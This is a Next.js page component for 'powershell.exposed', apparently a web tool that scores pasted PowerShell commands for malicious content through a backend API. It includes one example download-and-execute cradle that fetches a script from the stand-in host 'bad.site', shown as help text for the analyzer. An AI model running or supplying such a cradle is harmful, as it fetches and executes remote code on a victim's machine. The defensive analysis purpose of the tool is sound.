"use client"
import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { useAuth } from "./contexts/AuthContext";
import { useAnalysisEvent } from "./contexts/AnalysisEventContext";
import { useIpAddress } from "../hooks/useIpAddress";
import { useRateLimit } from "../hooks/useRateLimit";
import LoadingSpinner from "./components/LoadingSpinner";
import { ErrorMessage, InfoMessage } from "./components/Messages";
import CommandInput from "./components/CommandInput";
import ThemedButton from "./components/ThemedButton";
import AnalysisChat from "./components/AnalysisChat";

export default function Home() {
  const router = useRouter();
  const { user, isAuthenticated } = useAuth();
  const { notifyNewAnalysis } = useAnalysisEvent();
  const { ipAddress, ipLocation, loading: ipLoading, error: ipError } = useIpAddress();
  const { 
    rateLimitInfo, 
    handleRateLimitResponse, 
    reset: resetRateLimit,
    timeLeft,
    isTimerActive,
    formatTime
  } = useRateLimit();
  const [error, setError] = useState("");
  const [command, setCommand] = useState("");
  const [loading, setLoading] = useState(false);







  // Verificar autenticação - REMOVIDO para permitir acesso de usuários não logados
  // useEffect(() => {
  //   if (!isAuthenticated()) {
  //     router.push('/landing');
  //   }
  // }, [isAuthenticated, router]);





  // Função para validar se o input é um comando PowerShell válido
  const validatePowerShellCommand = (input) => {
    if (!input || typeof input !== 'string') {
      return { isValid: false, error: "Command cannot be empty." };
    }

    const trimmedInput = input.trim();
    if (trimmedInput.length === 0) {
      return { isValid: false, error: "Command cannot be empty." };
    }

    // Don't remove content after # as it might be part of URLs or other valid content
    // Only check if the input is entirely made of PowerShell comments (lines starting with #)
    const lines = trimmedInput.split('\n');
    const nonCommentLines = lines.filter(line => {
      const cleanLine = line.trim();
      return cleanLine.length > 0 && !cleanLine.startsWith('#');
    });
    
    if (nonCommentLines.length === 0) {
      return { isValid: false, error: "Command cannot contain only comments." };
    }

    // Preserve all characters including \r\n, \n, and special characters
    // The backend will handle the actual analysis with proper multi-line support
    return { isValid: true, error: null };
  };

  // Command analysis - fazer análise diretamente e redirecionar para ID
  const handleAnalyze = async (e) => {
    e.preventDefault();
    
    const validation = validatePowerShellCommand(command);
    if (!validation.isValid) {
      setError(validation.error);
      return;
    }
    
    setError(""); // Clear previous error
    setLoading(true); // Mostrar loading
    
    try {
      
      // Obter ou criar sessão anônima
      const { getOrCreateSession, saveSessionFromBackend } = await import('../utils/session');
      const sessionId = getOrCreateSession();
      
      // Preparar dados para a API
      const requestData = { 
        command,
        user_id: user?.id || null,
        ip_address: ipAddress,
        country: ipLocation?.country,
        city: ipLocation?.city,
        region: ipLocation?.region,
        timezone: ipLocation?.timezone,
        user_agent: navigator.userAgent,
        search_type: "WEB",
        session_id: sessionId
      };



      // Chamar a API Python diretamente com autenticação opcional
      const { makeAuthenticatedRequest } = await import('../../lib/api');
      const response = await makeAuthenticatedRequest('/analyze-pcre2', {
        method: 'POST',
        body: JSON.stringify(requestData)
      });

      const data = await response.json();
      
      // Verificar se precisa de rate limiting
      const needsHandling = handleRateLimitResponse(response, data);
      
      if (needsHandling) {
        setLoading(false);
        return;
      }
      
      if (!response.ok) {
        setError(data.error || `HTTP error! status: ${response.status}`);
        setLoading(false);
        return;
      }
      
      if (data.success && data.analysis_id) {
        
        // Salvar session_id se necessário
        if (data.session_id && !user?.id) {
          saveSessionFromBackend(data.session_id);
        }
        
        // Salvar análise anônima em cookies se não estiver logado
        if (!user?.id) {
          try {
            const { saveAnonymousAnalysis } = await import('../utils/cookies');
            saveAnonymousAnalysis({
              command: command,
              score: data.analysis.risk_score,
              severity: data.analysis.is_malicious ? "malicious" : "safe",
              signatures: data.analysis.signatures_detected || [],
              cmdlets_detected: data.analysis.cmdlets_detected || [],
              analysis_id: data.analysis_id
            });
          } catch (error) {
            // Ignorar erro ao salvar análise anônima
          }
        }
        
        resetRateLimit(); // Limpar estado do rate limit
        
        // Notificar que uma nova análise foi feita
        notifyNewAnalysis();
        
        // Redirecionar imediatamente para evitar stutter
        router.push(`/analysis/${data.analysis_id}`);
      } else {
        setError(data.error || 'Analysis failed');
        setLoading(false);
      }
      
    } catch (err) {
      setError(err.message || 'Analysis failed');
      setLoading(false);
    }
  };

  // Validação em tempo real quando o usuário digita
  const handleCommandChange = (e) => {
    const newCommand = e.target.value;
    setCommand(newCommand);
    
    // Clear error if field is empty
    if (!newCommand.trim()) {
      setError("");
      return;
    }
    
    // Basic real-time validation (only for obvious errors)
    if (newCommand.trim().length > 5) {
      const validation = validatePowerShellCommand(newCommand);
      if (!validation.isValid && (
        validation.error.includes("plain text") || 
        validation.error.includes("description") ||
        validation.error.includes("only comments")
      )) {
        setError(validation.error);
      } else {
        setError("");
      }
    }
  };

  return (
    <div className="flex h-screen overflow-hidden relative">
      
      <div className="flex-shrink-0 relative z-10">
        <AnalysisChat />
      </div>
      
    
      <div className="flex-1 flex flex-col items-center justify-center p-4 sm:p-6 md:p-8 overflow-hidden relative z-10">
        <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
          <form onSubmit={handleAnalyze}>
            <div className="flex flex-col md:flex-row items-stretch md:items-center gap-4">
              <div className="flex-1">
                <h1 className="text-2xl sm:text-3xl md:text-4xl font-mono font-bold mb-6 sm:mb-8 text-center px-2 flex items-center justify-center gap-3" style={{color: 'var(--accent)'}}>
                  <svg 
                    viewBox="0 0 256 256" 
                    xmlns="http://www.w3.org/2000/svg" 
                    aria-label="powershell.exposed icon: ! >"
                    className="w-8 h-8 sm:w-10 sm:h-10 md:w-12 md:h-12"
                  >
                    <defs>
                      <mask id="cut3">
                        <rect x="24" y="24" width="208" height="208" rx="28" fill="white"/>
                        <line x1="86" y1="92" x2="86" y2="148" stroke="black" strokeWidth="20" strokeLinecap="round"/>
                        <circle cx="86" cy="170" r="10" fill="black"/>
                        <polyline points="120,100 172,128 120,156" fill="none"
                          stroke="black" strokeWidth="24" strokeLinecap="round" strokeLinejoin="round"/>
                      </mask>
                    </defs>
                    <rect x="24" y="24" width="208" height="208" rx="28" fill="#1CC76D" mask="url(#cut3)"/>
                  </svg>
                  powershell.exposed
                </h1>
                <CommandInput
                  value={command}
                  onChange={handleCommandChange}
                  onSubmit={() => handleAnalyze({ preventDefault: () => {} })}
                  placeholder="Type or paste a PS payload..."
                  error={error}
                />
              </div>
            
            <div className="flex-shrink-0 flex items-center">
              <ThemedButton
                type="submit"
                disabled={error !== "" || loading || (rateLimitInfo && rateLimitInfo.current_count >= rateLimitInfo.limit)}
                className="w-full md:w-auto px-6 py-3"
              >
                {loading ? (
                  <div className="flex items-center gap-2">
                    <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white"></div>
                    Analyzing...
                  </div>
                ) : (
                  'Evaluate'
                )}
              </ThemedButton>
            </div>
          </div>
          
          <ErrorMessage message={error} />
          
          
          {rateLimitInfo && (
            <div className="mt-4 rounded-lg border-2" style={{backgroundColor: 'var(--card-bg)', borderColor: 'var(--border-color)'}}>
              <div className="p-4">
                
                <div className="text-center mb-4">
                  <div className="font-mono text-sm mb-2" style={{color: 'var(--muted-foreground)'}}>
                    <strong>Notice:</strong> You have made <span style={{color: 'var(--accent)'}}>{rateLimitInfo.current_count}</span> of <span style={{color: 'var(--accent)'}}>{rateLimitInfo.limit}</span> allowed searches in {rateLimitInfo.window_seconds} seconds.
                  </div>
                </div>

                {rateLimitInfo.current_count >= rateLimitInfo.limit && (
                  <div>
                   
                    <div className="text-center mb-6">
                      <div className="inline-flex items-center gap-3 px-4 py-2 rounded-full border-2 border-red-500" style={{backgroundColor: 'var(--background)'}}>
                        <span className="text-2xl">🚫</span>
                        <span className="font-mono font-bold text-red-500">Rate limit reached</span>
                      </div>
                    </div>
                    
                   
                    {isTimerActive && timeLeft > 0 && (
                      <div className="text-center">
                        <div className="inline-block p-6 rounded-xl border-2" style={{backgroundColor: 'var(--background)', borderColor: 'var(--accent)'}}>
                         
                          <div className="text-4xl mb-3">⏰</div>
                          
                         
                          <div className="font-mono font-bold text-xl mb-3" style={{color: 'var(--accent)'}}>
                            Wait for reset
                          </div>
                          
                          
                          <div className="font-mono text-3xl font-bold mb-4 px-4 py-2 rounded-lg border" style={{
                            color: 'var(--accent)', 
                            backgroundColor: 'var(--card-bg)',
                            borderColor: 'var(--border-color)'
                          }}>
                            {formatTime}
                          </div>
                          
                        
                          <div className="font-mono text-sm max-w-xs mx-auto" style={{color: 'var(--muted-foreground)'}}>
                            You can make new searches when the timer reaches zero
                          </div>
                          
                         
                          <div className="mt-4 w-full bg-gray-200 dark:bg-gray-700 rounded-full h-2">
                            <div 
                              className="h-2 rounded-full transition-all duration-1000" 
                              style={{
                                backgroundColor: 'var(--accent)',
                                width: `${Math.max(0, (timeLeft / 60) * 100)}%`
                              }}
                            ></div>
                          </div>
                        </div>
                      </div>
                    )}
                  </div>
                )}
              </div>
            </div>
          )}

          <InfoMessage 
            message={!error && command.trim() === "" ? "Example: IEX(New-Object Net.WebClient).DownloadString('http://bad.site/payload.ps1')" : ""}
            clickable={!error && command.trim() === ""}
            onClick={() => setCommand("IEX(New-Object Net.WebClient).DownloadString('http://bad.site/payload.ps1')")}
          />
        </form>
        </div>
      </div>
    </div>
  );
}